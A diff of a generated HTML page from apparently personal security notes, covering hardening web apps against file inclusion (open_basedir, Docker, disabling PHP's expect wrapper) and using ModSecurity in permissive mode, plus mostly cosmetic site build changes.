+<p>It’s also often possible to lock web apps to their web root directory, preventing them from accessing non-web related files. The most common way to do this is by running the app within Docker. However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding <code>open_basedir = /var/www</code> in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like the PHP <code>expect://</code> wrapper and the PHP module <code>mod_userdir</code>.</p>
 <p>If these configs are applied, it should prevent accessing files outside the web application folder, so even if an LFI vuln is identified, its impact would be reduced.</p>
 <h4 id="waf"><a class="header" href="#waf">WAF</a></h4>
-<p>The universal way to harden apps is to utilize WAFs, such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.</p>
+<p>The universal way to harden apps is to utilize WAFs, such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to “blocking mode”, just having it in permissive mode can be an early warning sign that your application is being attacked.</p>
 <p>Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020, the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker.</p>
-<p>It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is "secure". Hardened systems should be continually tested, especially after a zero-day is released for a relatedd application to your system. In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm the exploit was used against the system or not.<!-- {% embed footer message="2026 • Created by [d41y](https://github.com/d41y)" %} --></p>
-<div data-embedify data-app="footer" data-option-message="2026 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
-<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2026 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+<p>It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is “secure”. Hardened systems should be continually tested, especially after a zero-day is released for a relatedd application to your system. In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm the exploit was used against the system or not.</p>
+
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
                             <a rel="prev" href="../../../../attack/web/web_attacks/server_side/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
-                                <i class="fa fa-angle-left"></i>
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                             </a>
 
                             <a rel="next prefetch" href="../../../../attack/web/web_attacks/server_side/file_upload_attacks.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                                <i class="fa fa-angle-right"></i>
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                             </a>
 
                         <div style="clear: both"></div>
@@ -1048,15 +1100,21 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
                     <a rel="prev" href="../../../../attack/web/web_attacks/server_side/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
-                        <i class="fa fa-angle-left"></i>
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                     </a>
 
                     <a rel="next prefetch" href="../../../../attack/web/web_attacks/server_side/file_upload_attacks.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                        <i class="fa fa-angle-right"></i>
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                     </a>
             </nav>
 
         </div>
+
+        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
+        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
+        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
+        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
+        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>
 
         <!-- Livereload script (if served using the cli tool) -->
         <script>
@@ -1076,22 +1134,20 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
         </script>
 
 
-
         <script>
             window.playground_copyable = true;
         </script>
 
 
-        <script src="../../../../elasticlunr.min.js"></script>
-        <script src="../../../../mark.min.js"></script>
-        <script src="../../../../searcher.js"></script>
+        <script src="../../../../elasticlunr-ef4e11c1.min.js"></script>
+        <script src="../../../../mark-09e88c2c.min.js"></script>
+        <script src="../../../../searcher-c2a407aa.js"></script>
 
-        <script src="../../../../clipboard.min.js"></script>
-        <script src="../../../../highlight.js"></script>
-        <script src="../../../../book.js"></script>
+        <script src="../../../../clipboard-1626706a.min.js"></script>
+        <script src="../../../../highlight-abc7f01d.js"></script>
+        <script src="../../../../book-a0b12cfe.js"></script>
 
         <!-- Custom JS scripts -->
-        <script src="../../../../theme/pagetoc.js"></script>
 
 
 
